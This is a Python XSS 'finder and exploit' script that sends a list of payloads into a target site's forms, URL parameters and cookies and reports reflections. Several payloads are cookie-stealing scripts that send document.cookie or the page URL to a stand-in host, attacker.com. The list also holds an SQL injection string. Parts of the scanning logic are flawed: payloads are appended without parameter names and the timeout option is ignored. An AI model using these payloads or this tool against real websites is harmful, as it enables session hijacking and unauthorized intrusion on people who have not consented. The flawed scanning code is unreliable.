import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
import asyncio
import aiohttp
import time
import argparse
import sys
import os

# Define advanced XSS payloads (with more variety)
payloads = [
    "<script>alert('XSS')</script>",  
    "\"'><img src=x onerror=alert('XSS')>",  
    "<svg/onload=alert('XSS')>",  
    "<img src='x' onerror='alert(1)'>",  
    "<iframe src='javascript:alert(1)'></iframe>",  
    "<script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>",  
    "<script>window.location='http://attacker.com/steal?url='+window.location</script>",  
    "<script>document.write('<img src=\"http://attacker.com/cookie?cookie='+document.cookie+'\" />');</script>",  
    "<script>eval('alert(1)')</script>",  
    "a' or 1=1 --",  
    "<script>eval(atob('YWxlcnQoMSk='))</script>",  
    "<script>alert('XSS');</script>",  # Common alert-based XSS
    "<script>document.location='http://attacker.com?cookie=' + document.cookie</script>",  # Cookie stealing XSS
    "<script>alert('Injected')</script>",  # Generic alert-based payload
    "<div onmouseover=alert(1)>mouseover XSS</div>",  # Onmouseover XSS
    "<img src='x' onerror='alert(document.domain)'>",  # Error-based XSS
    "<svg/onload=confirm(1)>",  # SVG-based XSS
    "<script>document.body.appendChild(document.createElement('iframe')).src='http://attacker.com'</script>",  # iframe-based XSS
]

# Function to check for XSS in the response
def check_xss(response, payload):
    if payload in response.text:
        return True
    return False

# Function to get detailed information about the target website (headers, cookies, etc.)
async def get_target_details(url, session):
    try:
        async with session.get(url, timeout=10) as response:
            response.raise_for_status()
            
            headers = response.headers
            cookies = response.cookies
            
            soup = BeautifulSoup(await response.text(), "html.parser")
            title = soup.title.string if soup.title else "No title found"
            description = ""
            for meta in soup.find_all("meta"):
                if "description" in meta.attrs.get("name", "").lower():
                    description = meta.attrs.get("content", "No description found")
            
            return {
                "url": url,
                "status_code": response.status,
                "title": title,
                "description": description,
                "headers": headers,
                "cookies": cookies,
            }
    except Exception as e:
        print(f"Error retrieving target details: {e}")
        return None

# Function to scan URL parameters for XSS vulnerabilities
async def scan_url_params(url, payload, session):
    parsed_url = urlparse(url)
    params = parsed_url.query
    if params:
        new_url = f"{url}&{payload}"
        try:
            async with session.get(new_url, timeout=10) as response:
                if check_xss(response, payload):
                    print(f"[+] XSS Found in URL: {new_url}")
        except Exception as e:
            print(f"Error scanning URL parameters: {e}")

# Function to scan cookies for XSS vulnerabilities
async def scan_cookies(url, payload, session):
    cookies = {"session": "testcookie"}
    try:
        async with session.get(url, cookies=cookies, timeout=10) as response:
            if check_xss(response, payload):
                print(f"[+] XSS Found in Cookies: {url}")
    except Exception as e:
        print(f"Error scanning cookies: {e}")

# Function to scan forms and inject payloads
async def exploit_form(form_details, payload, session):
    data = {}
    for input_tag in form_details["inputs"]:
        if input_tag["type"] == "text":
            data[input_tag["name"]] = payload

    try:
        if form_details["method"] == "post":
            async with session.post(form_details["action"], data=data, timeout=10) as response:
                if check_xss(response, payload):
                    print(f"[+] Exploited XSS in form: {form_details['action']} with payload: {payload}")
        else:
            async with session.get(form_details["action"], params=data, timeout=10) as response:
                if check_xss(response, payload):
                    print(f"[+] Exploited XSS in form: {form_details['action']} with payload: {payload}")
    except Exception as e:
        print(f"Error exploiting form: {e}")

# Main function to handle scanning and exploit
async def bukhari_xss_finder_exploit(url):
    async with aiohttp.ClientSession() as session:
        # Retrieve target details (headers, cookies, etc.)
        target_details = await get_target_details(url, session)
        if not target_details:
            return

        print(f"\nScanning target: {target_details['url']}")
        print(f"Title: {target_details['title']}")
        print(f"Description: {target_details['description']}")
        print(f"Status Code: {target_details['status_code']}")
        print(f"Headers: {target_details['headers']}")
        print(f"Cookies: {target_details['cookies']}\n")

        # Send GET request to the page
        try:
            async with session.get(url, timeout=10) as response:
                response.raise_for_status()
                soup = BeautifulSoup(await response.text(), "html.parser")
        except Exception as e:
            print(f"Error loading page: {e}")
            return

        # Scan forms for potential XSS injection points
        forms = soup.find_all("form")
        tasks = []
        for form in forms:
            form_details = {}
            action = form.get("action")
            method = form.get("method", "get").lower()
            inputs = form.find_all("input")
            form_details["action"] = urljoin(url, action)
            form_details["method"] = method
            form_details["inputs"] = []

            for input_tag in inputs:
                input_name = input_tag.get("name")
                input_type = input_tag.get("type", "text")
                form_details["inputs"].append({"name": input_name, "type": input_type})

            for payload in payloads:
                tasks.append(exploit_form(form_details, payload, session))

        # Scan URL parameters for XSS
        for payload in payloads:
            tasks.append(scan_url_params(url, payload, session))

        # Scan cookies for XSS
        for payload in payloads:
            tasks.append(scan_cookies(url, payload, session))

        # Wait for all tasks to complete
        await asyncio.gather(*tasks)

# CLI setup
def main():
    parser = argparse.ArgumentParser(description="Bukhari XSS Finder - A Super Fast XSS Vulnerability Finder")
    parser.add_argument("url", type=str, help="URL of the website to scan")
    parser.add_argument("--timeout", type=int, default=10, help="Request timeout in seconds (default: 10)")
    args = parser.parse_args()

    target_url = args.url
    timeout = args.timeout
    
    # Run the exploit scanner
    loop = asyncio.get_event_loop()
    loop.run_until_complete(bukhari_xss_finder_exploit(target_url))

if __name__ == "__main__":
    main()
